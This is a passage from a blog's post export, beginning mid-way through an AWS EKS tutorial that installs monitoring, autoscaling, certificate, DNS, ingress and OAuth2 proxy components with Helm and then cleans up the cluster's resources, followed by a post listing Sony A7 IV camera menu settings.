prometheusOperator: tls: enabled: false admissionWebhooks: enabled: false networkPolicy: enabled: true prometheus: networkPolicy: enabled: false ingress: enabled: true ingressClassName: nginx annotations: forecastle.stakater.com/expose: \"true\" forecastle.stakater.com/icon: https://raw.githubusercontent.com/cncf/artwork/master/projects/prometheus/icon/color/prometheus-icon-color.svg forecastle.stakater.com/appName: Prometheus nginx.ingress.kubernetes.io/auth-url: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/auth nginx.ingress.kubernetes.io/auth-signin: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/start?rd=\\$scheme://\\$host\\$request_uri paths: [\"/\"] pathType: ImplementationSpecific hosts: - prometheus.${CLUSTER_FQDN} tls: - hosts: - prometheus.${CLUSTER_FQDN} prometheusSpec: externalLabels: cluster: ${CLUSTER_FQDN} externalUrl: https://prometheus.${CLUSTER_FQDN} ruleSelectorNilUsesHelmValues: false serviceMonitorSelectorNilUsesHelmValues: false podMonitorSelectorNilUsesHelmValues: false retentionSize: 1GB walCompression: true storageSpec: volumeClaimTemplate: spec: storageClassName: gp2 accessModes: [\"ReadWriteOnce\"] resources: requests: storage: 2Gi EOF helm upgrade --install --version \"${KUBE_PROMETHEUS_STACK_HELM_CHART_VERSION}\" --namespace kube-prometheus-stack --create-namespace --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-kube-prometheus-stack.yml\" kube-prometheus-stack prometheus-community/kube-prometheus-stack karpenter Customize the karpenter default installation by upgrading its Helm chart and modifying the default values: # renovate: datasource=github-tags depName=aws/karpenter extractVersion=^(?&lt;version&gt;.*)$ KARPENTER_HELM_CHART_VERSION=\"v0.31.4\" tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-karpenter.yml\" &lt;&lt; EOF replicas: 1 serviceMonitor: enabled: true settings: aws: enablePodENI: true reservedENIs: \"1\" EOF helm upgrade --install --version \"${KARPENTER_HELM_CHART_VERSION}\" --namespace karpenter --reuse-values --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-karpenter.yml\" karpenter oci://public.ecr.aws/karpenter/karpenter cert-manager cert-manager adds certificates and certificate issuers as resource types in Kubernetes clusters. It also simplifies the process of obtaining, renewing, and using those certificates. The cert-manager service account was previously created by eksctl. Install the cert-manager Helm chart and modify its default values: # renovate: datasource=helm depName=cert-manager registryUrl=https://charts.jetstack.io CERT_MANAGER_HELM_CHART_VERSION=\"1.14.3\" helm repo add --force-update jetstack https://charts.jetstack.io tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-cert-manager.yml\" &lt;&lt; EOF installCRDs: true serviceAccount: create: false name: cert-manager extraArgs: - --cluster-resource-namespace=cert-manager - --enable-certificate-owner-ref=true securityContext: fsGroup: 1001 prometheus: servicemonitor: enabled: true webhook: networkPolicy: enabled: true EOF helm upgrade --install --version \"${CERT_MANAGER_HELM_CHART_VERSION}\" --namespace cert-manager --create-namespace --wait --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-cert-manager.yml\" cert-manager jetstack/cert-manager Add ClusterIssuers for the Let‚Äôs Encrypt staging environment: tee \"${TMP_DIR}/${CLUSTER_FQDN}/k8s-cert-manager-clusterissuer-staging.yml\" &lt;&lt; EOF | kubectl apply -f - apiVersion: cert-manager.io/v1 kind: ClusterIssuer metadata: name: letsencrypt-staging-dns namespace: cert-manager labels: letsencrypt: staging spec: acme: server: https://acme-staging-v02.api.letsencrypt.org/directory email: ${MY_EMAIL} privateKeySecretRef: name: letsencrypt-staging-dns solvers: - selector: dnsZones: - ${CLUSTER_FQDN} dns01: route53: region: ${AWS_DEFAULT_REGION} EOF kubectl wait --namespace cert-manager --timeout=15m --for=condition=Ready clusterissuer --all Create the certificate: tee \"${TMP_DIR}/${CLUSTER_FQDN}/k8s-cert-manager-certificate-staging.yml\" &lt;&lt; EOF | kubectl apply -f - apiVersion: cert-manager.io/v1 kind: Certificate metadata: name: ingress-cert-staging namespace: cert-manager labels: letsencrypt: staging spec: secretName: ingress-cert-staging secretTemplate: labels: letsencrypt: staging issuerRef: name: letsencrypt-staging-dns kind: ClusterIssuer commonName: \"*.${CLUSTER_FQDN}\" dnsNames: - \"*.${CLUSTER_FQDN}\" - \"${CLUSTER_FQDN}\" EOF external-dns ExternalDNS synchronizes exposed Kubernetes Services and Ingresses with DNS providers. ExternalDNS will manage the DNS records. The external-dns service account was previously created by eksctl. Install the external-dns Helm chart and modify its default values: # renovate: datasource=helm depName=external-dns registryUrl=https://kubernetes-sigs.github.io/external-dns/ EXTERNAL_DNS_HELM_CHART_VERSION=\"1.14.3\" helm repo add --force-update external-dns https://kubernetes-sigs.github.io/external-dns/ tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-external-dns.yml\" &lt;&lt; EOF domainFilters: - ${CLUSTER_FQDN} interval: 20s policy: sync serviceAccount: create: false name: external-dns serviceMonitor: enabled: true EOF helm upgrade --install --version \"${EXTERNAL_DNS_HELM_CHART_VERSION}\" --namespace external-dns --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-external-dns.yml\" external-dns external-dns/external-dns ingress-nginx ingress-nginx is an Ingress controller for Kubernetes that uses nginx as a reverse proxy and load balancer. Install the ingress-nginx Helm chart and modify its default values: # renovate: datasource=helm depName=ingress-nginx registryUrl=https://kubernetes.github.io/ingress-nginx INGRESS_NGINX_HELM_CHART_VERSION=\"4.9.1\" kubectl wait --namespace cert-manager --for=condition=Ready --timeout=10m certificate ingress-cert-staging helm repo add --force-update ingress-nginx https://kubernetes.github.io/ingress-nginx tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-ingress-nginx.yml\" &lt;&lt; EOF controller: allowSnippetAnnotations: true ingressClassResource: default: true admissionWebhooks: networkPolicyEnabled: true extraArgs: default-ssl-certificate: \"cert-manager/ingress-cert-staging\" service: annotations: service.beta.kubernetes.io/aws-load-balancer-type: nlb service.beta.kubernetes.io/aws-load-balancer-additional-resource-tags: ${TAGS//\\'/} metrics: enabled: true serviceMonitor: enabled: true prometheusRule: enabled: true rules: - alert: NGINXConfigFailed expr: count(nginx_ingress_controller_config_last_reload_successful == 0) &gt; 0 for: 1s labels: severity: critical annotations: description: bad ingress config - nginx config test failed summary: uninstall the latest ingress changes to allow config reloads to resume - alert: NGINXCertificateExpiry expr: (avg(nginx_ingress_controller_ssl_expire_time_seconds) by (host) - time()) &lt; 604800 for: 1s labels: severity: critical annotations: description: ssl certificate(s) will expire in less then a week summary: renew expiring certificates to avoid downtime - alert: NGINXTooMany500s expr: 100 * ( sum( nginx_ingress_controller_requests{status=~\"5.+\"} ) / sum(nginx_ingress_controller_requests) ) &gt; 5 for: 1m labels: severity: warning annotations: description: Too many 5XXs summary: More than 5% of all requests returned 5XX, this requires your attention - alert: NGINXTooMany400s expr: 100 * ( sum( nginx_ingress_controller_requests{status=~\"4.+\"} ) / sum(nginx_ingress_controller_requests) ) &gt; 5 for: 1m labels: severity: warning annotations: description: Too many 4XXs summary: More than 5% of all requests returned 4XX, this requires your attention EOF helm upgrade --install --version \"${INGRESS_NGINX_HELM_CHART_VERSION}\" --namespace ingress-nginx --create-namespace --wait --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-ingress-nginx.yml\" ingress-nginx ingress-nginx/ingress-nginx forecastle Forecastle is a control panel that dynamically discovers and provides a launchpad for accessing applications deployed on Kubernetes. Install the forecastle Helm chart and modify its default values: # renovate: datasource=helm depName=forecastle registryUrl=https://stakater.github.io/stakater-charts FORECASTLE_HELM_CHART_VERSION=\"1.0.136\" helm repo add --force-update stakater https://stakater.github.io/stakater-charts tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-forecastle.yml\" &lt;&lt; EOF forecastle: config: namespaceSelector: any: true title: Launch Pad networkPolicy: enabled: true ingress: enabled: true annotations: nginx.ingress.kubernetes.io/auth-signin: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/start?rd=\\$scheme://\\$host\\$request_uri nginx.ingress.kubernetes.io/auth-url: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/auth className: nginx hosts: - host: ${CLUSTER_FQDN} paths: - path: / pathType: Prefix tls: - hosts: - ${CLUSTER_FQDN} EOF helm upgrade --install --version \"${FORECASTLE_HELM_CHART_VERSION}\" --namespace forecastle --create-namespace --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-forecastle.yml\" forecastle stakater/forecastle oauth2-proxy Use OAuth2 Proxy to protect the application endpoints with Google Authentication. Install the oauth2-proxy Helm chart and modify its default values: # renovate: datasource=helm depName=oauth2-proxy registryUrl=https://oauth2-proxy.github.io/manifests OAUTH2_PROXY_HELM_CHART_VERSION=\"6.24.1\" helm repo add --force-update oauth2-proxy https://oauth2-proxy.github.io/manifests tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-oauth2-proxy.yml\" &lt;&lt; EOF config: clientID: ${GOOGLE_CLIENT_ID} clientSecret: ${GOOGLE_CLIENT_SECRET} cookieSecret: \"$(openssl rand -base64 32 | head -c 32 | base64)\" configFile: |- cookie_domains = \".${CLUSTER_FQDN}\" set_authorization_header = \"true\" set_xauthrequest = \"true\" upstreams = [ \"file:///dev/null\" ] whitelist_domains = \".${CLUSTER_FQDN}\" authenticatedEmailsFile: enabled: true restricted_access: |- ${MY_EMAIL} ingress: enabled: true className: nginx hosts: - oauth2-proxy.${CLUSTER_FQDN} tls: - hosts: - oauth2-proxy.${CLUSTER_FQDN} metrics: servicemonitor: enabled: true EOF helm upgrade --install --version \"${OAUTH2_PROXY_HELM_CHART_VERSION}\" --namespace oauth2-proxy --create-namespace --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-oauth2-proxy.yml\" oauth2-proxy oauth2-proxy/oauth2-proxy Clean-up Remove the EKS cluster and its created components: if eksctl get cluster --name=\"${CLUSTER_NAME}\"; then eksctl delete cluster --name=\"${CLUSTER_NAME}\" --force fi Remove the Route 53 DNS records from the DNS Zone: CLUSTER_FQDN_ZONE_ID=$(aws route53 list-hosted-zones --query \"HostedZones[?Name==\\`${CLUSTER_FQDN}.\\`].Id\" --output text) if [[ -n \"${CLUSTER_FQDN_ZONE_ID}\" ]]; then aws route53 list-resource-record-sets --hosted-zone-id \"${CLUSTER_FQDN_ZONE_ID}\" | jq -c '.ResourceRecordSets[] | select (.Type != \"SOA\" and .Type != \"NS\")' | while read -r RESOURCERECORDSET; do aws route53 change-resource-record-sets \\ --hosted-zone-id \"${CLUSTER_FQDN_ZONE_ID}\" \\ --change-batch '{\"Changes\":[{\"Action\":\"DELETE\",\"ResourceRecordSet\": '\"${RESOURCERECORDSET}\"' }]}' \\ --output text --query 'ChangeInfo.Id' done fi Remove any orphan EC2 instances created by Karpenter: for EC2 in $(aws ec2 describe-instances --filters \"Name=tag:kubernetes.io/cluster/${CLUSTER_NAME},Values=owned\" Name=instance-state-name,Values=running --query \"Reservations[].Instances[].InstanceId\" --output text); do echo \"Removing EC2: ${EC2}\" aws ec2 terminate-instances --instance-ids \"${EC2}\" done Remove the CloudWatch log group: if [[ \"$(aws logs describe-log-groups --query \"logGroups[?logGroupName==\\`/aws/eks/${CLUSTER_NAME}/cluster\\`] | [0].logGroupName\" --output text)\" = \"/aws/eks/${CLUSTER_NAME}/cluster\" ]]; then aws logs delete-log-group --log-group-name \"/aws/eks/${CLUSTER_NAME}/cluster\" fi Remove the CloudFormation stack: aws cloudformation delete-stack --stack-name \"${CLUSTER_NAME}-route53\" Wait for all CloudFormation stacks to complete deletion: aws cloudformation wait stack-delete-complete --stack-name \"${CLUSTER_NAME}-route53\" aws cloudformation wait stack-delete-complete --stack-name \"eksctl-${CLUSTER_NAME}-cluster\" Remove volumes and snapshots related to the cluster (as a precaution): for VOLUME in $(aws ec2 describe-volumes --filter \"Name=tag:KubernetesCluster,Values=${CLUSTER_NAME}\" \"Name=tag:kubernetes.io/cluster/${CLUSTER_NAME},Values=owned\" --query 'Volumes[].VolumeId' --output text); do echo \"*** Removing Volume: ${VOLUME}\" aws ec2 delete-volume --volume-id \"${VOLUME}\" done Remove the ${TMP_DIR}/${CLUSTER_FQDN} directory: if [[ -d \"${TMP_DIR}/${CLUSTER_FQDN}\" ]]; then for FILE in \"${TMP_DIR}/${CLUSTER_FQDN}\"/{kubeconfig-${CLUSTER_NAME}.conf,{aws-cf-route53,eksctl-${CLUSTER_NAME},k8s-karpenter-provisioner,helm_values-{aws-node-termination-handler,cert-manager,external-dns,forecastle,ingress-nginx,karpenter,kube-prometheus-stack,mailhog,oauth2-proxy},k8s-cert-manager-{certificate,clusterissuer}-staging}.yml}; do if [[ -f \"${FILE}\" ]]; then rm -v \"${FILE}\" else echo \"*** File not found: ${FILE}\" fi done rmdir \"${TMP_DIR}/${CLUSTER_FQDN}\" fi Enjoy ‚Ä¶ üòâ" }, { "title": "My Sony A7 IV settings", "url": "/posts/my-sony-a7-iv-settings/", "categories": "Photography, Cameras", "tags": "Sony A7 IV, settings, video, photo, cameras", "date": "2022-09-02 00:00:00 +0200", "content": "I wanted to summarize my notes about the Sony A7 IV settings. Settings are separated into Photo and Video sections. Photo flowchart LR AA1[My Menu \\n Setting] --&gt; AA2(Add Item) --&gt; AA3(Drive Mode) --&gt; AA4(Interval \\n Shoot Func.) AB1[My Menu \\n Setting] --&gt; AB2(Add Item) --&gt; AB3(Drive Mode) --&gt; AB4(Bracket \\n Settings) AC1[My Menu \\n Setting] --&gt; AC2(Add Item) --&gt; AC3(Finder / Monitor) --&gt; AC4(Monitor \\n Brightness) AD1[My Menu \\n Setting] --&gt; AD2(Add Item) --&gt; AD3(Zebra Display) --&gt; AD4(Zebra Display) AE1[My Menu \\n Setting] --&gt; AE2(Add Item) --&gt; AE3(Zebra Display) --&gt; AE4(Bluetooth) --&gt; AE5(Bluetooth \\n Function) AF1[My Menu \\n Setting] --&gt; AF2(Add Item) --&gt; AF3(Finder Monitor) --&gt; AF4(Select \\n Finder/Monitor) AG1[Shooting] --&gt; AG2(Image Quality) --&gt; AG3(JPEG/HEIF Switch) --&gt; AG4(\"HEIF (4:2:0)\") AH1[Shooting] --&gt; AH2(Image Quality) --&gt; AH3(Image Quality \\n Settings) --&gt; AH4(Slot 1) --&gt; AH5(File Format) --&gt; AH6(RAW) AI1[Shooting] --&gt; AI2(Image Quality) --&gt; AI3(Image Quality \\n Settings) --&gt; AI4(Slot 1) --&gt; AI5(RAW \\n File Type) --&gt; AI6(Losseless \\n Comp) AJ1[Shooting] --&gt; AJ2(Image Quality) --&gt; AJ3(Lens \\n Compensation) --&gt; AJ4(Distortion Comp.) --&gt; AJ5(Auto) AK1[Shooting] --&gt; AK2(Media) --&gt; AK3(Rec. Media \\n Settings) --&gt; AK4(Auto Switch Media) AL1[Shooting] --&gt; AL2(File) --&gt; AL3(File/Folder \\n Settings) --&gt; AL4(Set File Name) --&gt; AL5(\"A74\") AM1[Shooting] --&gt; AM2(File) --&gt; AM3(Copyright Info) --&gt; AM4(Write Copyright \\n Info) --&gt; AM5(On) AN1[Shooting] --&gt; AN2(File) --&gt; AN3(Copyright Info) --&gt; AN4(Set Photographer) --&gt; AN5(\"My Name\") AO1[Shooting] --&gt; AO2(File) --&gt; AO3(Copyright Info) --&gt; AO4(Set Copyright) --&gt; AO5(\"CC BY-SA\") AP1[Shooting] --&gt; AP2(File) --&gt; AP3(Write \\n Serial Number) --&gt; AP4(On) AQ1[Shooting] --&gt; AQ2(Drive Mode) --&gt; AQ3(Drive Mode) --&gt; AQ4(Cont. Shooting:) --&gt; AQ5(Mid) AR1[Shooting] --&gt; AR2(Drive Mode) --&gt; AR3(Bracket Settings) --&gt; AR4(\"Selftimer\") --&gt; AR5(2 sec) AS1[Shooting] --&gt; AS2(Drive Mode) --&gt; AS3(Interval Shoot \\n Func.) --&gt; AS4(Shooting \\n start time) --&gt; AS5(2 sec) AT1[Shooting] --&gt; AT2(Drive Mode) --&gt; AT3(Interval Shoot \\n Func.) --&gt; AT4(Shooting interval) --&gt; AT5(5 sec) AU1[Shooting] --&gt; AU2(Drive Mode) --&gt; AU3(Interval Shoot \\n Func.) --&gt; AU4(Shooting interval) --&gt; AU5(Number of shots) --&gt; AU6(300) AV1[Shooting] --&gt; AV2(Drive Mode) --&gt; AV3(Interval Shoot \\n Func.) --&gt; AV4(Shooting interval) --&gt; AV5(AE Tracking \\n Sensitivity) --&gt; AV6(Low) AW1[Exposure/Color] --&gt; AW2(Exposure) --&gt; AW3(ISO Range Limit) --&gt; AW4(50) --&gt; AW5(12800) AX1[Exposure/Color] --&gt; AX2(Metering) --&gt; AX3(Spot Metering Point) --&gt; AX4(Focus Point Link) AY1[Exposure/Color] --&gt; AY2(Zebra Display) --&gt; AY3(Zebra Display) --&gt; AY4(On) AZ1[Exposure/Color] --&gt; AZ2(Zebra Display) --&gt; AZ3(Zebra Level) --&gt; AZ4(C1) --&gt; AZ5(Lower Limit) --&gt; AZ6(109+) BA1[Focus] --&gt; BA2(AF/MF) --&gt; BA3(Focus Mode) --&gt; BA4(Continuous AF) BB1[Focus] --&gt; BB2(AF/MF) --&gt; BB3(AF Illuminator) --&gt; BB4(Off) BC1[Focus] --&gt; BC2(Focus Area) --&gt; BC3(Tracking:) --&gt; BC4(Spot S) BD1[Focus] --&gt; BD2(Focus Area) --&gt; BD3(Focus Area Color) --&gt; BD4(Red) BE1[Focus] --&gt; BE2(Face/Eye AF) --&gt; BE3(Face/Eye Frame Disp.) --&gt; BE4(On) BF1[Focus] --&gt; BF2(Peaking \\n Display) --&gt; BF3(On) BG1[Focus] --&gt; BG2(Peaking \\n Display) --&gt; BG3(Peaking Color) --&gt; BG4(Red) BH1[Playback] --&gt; BH2(Magnification) --&gt; BH3(Enlarge Initial \\n Position) --&gt; BH4(Focused Position) BI1[Playback] --&gt; BI2(Delete) --&gt; BI3(Delete pressing \\n twice) --&gt; BI4(On) BJ1[Playback] --&gt; BJ2(Playback \\n Option) --&gt; BJ3(Focus \\n Frame Display) --&gt; BJ4(On) BK1[Network] --&gt; BK2(Smartphone \\n Connect) --&gt; BK3(Smartphone Regist.) BL1[Network] --&gt; BL2(Smartphone \\n Connect) --&gt; BL3(Remote \\n Shoot Setting) --&gt; BL4(Still Img. \\n Save Dest.) --&gt; BL5(Camera Only) BM1[Network] --&gt; BM2(Transfer \\n Remote) --&gt; BM3(FTP Transfer \\n Func.) --&gt; BM4(FTP Function) --&gt; BM5(On) BN1[Network] --&gt; BN2(Transfer \\n Remote) --&gt; BN3(FTP Transfer \\n Func.) --&gt; BN4(Server \\n Setting) --&gt; BN5(Server 1) --&gt; BN6(...) BO1[Network] --&gt; BO2(Transfer \\n Remote) --&gt; BO3(FTP Transfer \\n Func.) --&gt; BO4(FTP Transfer) --&gt; BO5(Target Group) --&gt; BO6(This Media) BP1[Network] --&gt; BP2(Transfer \\n Remote) --&gt; BP3(FTP Transfer \\n Func.) --&gt; BP4(FTP Power \\n Save) --&gt; BP5(On) BQ1[Network] --&gt; BQ2(Wi-Fi) --&gt; BQ3(Wi-Fi Frequency \\n Band) --&gt; BQ4(2.4 GHz) BR1[Network] --&gt; BR2(Wi-Fi) --&gt; BR3(Access Point \\n Set.) --&gt; BR4(2.4 GHz) BS1[Setup] --&gt; BS2(Operations \\n Customize) --&gt; BS3(Custom Key/Dial \\n Set.) --&gt; BS4(Rear1) --&gt; BS5(4) --&gt; BS6(Shutter/Silent) --&gt; BS7(Switch \\n Silent Mode) BT1[Setup] --&gt; BT2(Operations \\n Customize) --&gt; BT3(Custom Key/Dial \\n Set.) --&gt; BT4(Rear1) --&gt; BT5(2) --&gt; BT6(Image Quality) --&gt; BT7(APS-C S35 \\n Full Frame) BU1[Setup] --&gt; BU2(Operations \\n Customize) --&gt; BU3(Custom Key/Dial \\n Set.) --&gt; BU4(Dial/Wheel) --&gt; BU5(4) --&gt; BU6(Exposure) --&gt; BU7(ISO) BV1[Setup] --&gt; BV2(Operations \\n Customize) --&gt; BV3(Custom Key/Dial \\n Set.) --&gt; BV4(Dial/Wheel) --&gt; BV5(Separate M mode \\n and other modes) BX1[Setup] --&gt; BX2(Operations \\n Customize) --&gt; BX3(Fn Menu Settings) --&gt; BX4(Face/Eye AF) --&gt; BX5(Face/Eye \\n Subject) BY1[Setup] --&gt; BY2(Operations \\n Customize) --&gt; BY3(Fn Menu Settings) --&gt; BY4(Exposure) --&gt; BY5(ISO AUTO Min. SS) BZ1[Setup] --&gt; BZ2(Operations \\n Customize) --&gt; BZ3(Fn Menu Settings) --&gt; BZ4(Zebra Display) --&gt; BZ5(Zebra Display) CA1[Setup] --&gt; CA2(Operations \\n Customize) --&gt; CA3(Fn Menu Settings) --&gt; CA4(White Balance) --&gt; CA5(White Balance) CB1[Setup] --&gt; CB2(Operations \\n Customize) --&gt; CB3(\"DISP (Screen Disp) \\n Set\") --&gt; CB4(Finder) --&gt; CB5(Display All \\n Info.) CC1[Setup] --&gt; CC2(Touch \\n Operation) --&gt; CC3(Touch Operation) --&gt; CC4(On) CD1[Setup] --&gt; CD2(Touch \\n Operation) --&gt; CD3(Touch Panel/Pad) --&gt; CD4(Touch Pad Only) CE1[Setup] --&gt; CE2(Touch \\n Operation) --&gt; CE3(Touch Func. \\n in Shooting) --&gt; CE4(Touch Focus) CF1[Setup] --&gt; CF2(Touch \\n Operation) --&gt; CF3(Touch Pad Settings) --&gt; CF4(Operation Area) --&gt; CF5(Left 1/2) CG1[Setup] --&gt; CG2(Display \\n Option) --&gt; CG3(Auto Review) --&gt; CG4(2s) CH1[Setup] --&gt; CH2(Power Setting \\n Option) --&gt; CH3(Auto Power OFF \\n Temp.) --&gt; CH4(High) CI1[Setup] --&gt; CI2(Sound Option) --&gt; CI3(Audio signals) --&gt; CI4(Off) CJ1[Setup] --&gt; CJ2(Setup Option) --&gt; CJ3(Anti-dust Function) --&gt; CJ4(Shutter When \\n Pwr OFF) --&gt; CJ5(On) CK1[Setup] --&gt; CK2(USB) --&gt; CK3(USB Connection \\n Mode) --&gt; CK4(\"MassStorage(MSC)\") Video flowchart LR A1[Shooting] --&gt; A2(Image Quality) --&gt; A3(File Format) --&gt; A4(XAVC HS 4K) B1[Shooting] --&gt; B2(Image Quality) --&gt; B3(Movie Settings) --&gt; B4(Record Setting) --&gt; B5(140M 4:2:2 10bit) C1[Shooting] --&gt; C2(Image Quality) --&gt; C3(S&amp;Q Settings) --&gt; C4(Frame Rate) --&gt; C5(1fps) D1[Shooting] --&gt; D2(File) --&gt; D3(File Name Format) --&gt; D4(Date + Title) E1[Shooting] --&gt; E2(File) --&gt; E3(File Name Format) --&gt; E4(Title Name \\n Settings) --&gt; E5(A74_) F1[Exposure / Color] --&gt; F2(Color / Tone) --&gt; F3(Picture Profile) --&gt; F4(PP11) G1[Setup] --&gt; G2(Operations \\n Customize) --&gt; G3(Different Set \\n for Still/Mv) --&gt; G4(\"(Select all)\") H1[Setup] --&gt; H2(Operations \\n Customize) --&gt; H3(REC w/ Shutter) --&gt; H4(On) Links: Sony A7IV BEGINNER‚ÄôS GUIDE to Custom Settings - Part 1 Top 7 Settings to Change on Sony a7 IV Sony A7IV ‚Äì Best Settings For Photography Sony A7 IV Beginners Guide - Set-Up, Menus, &amp; How-To Use the Camera" } ]
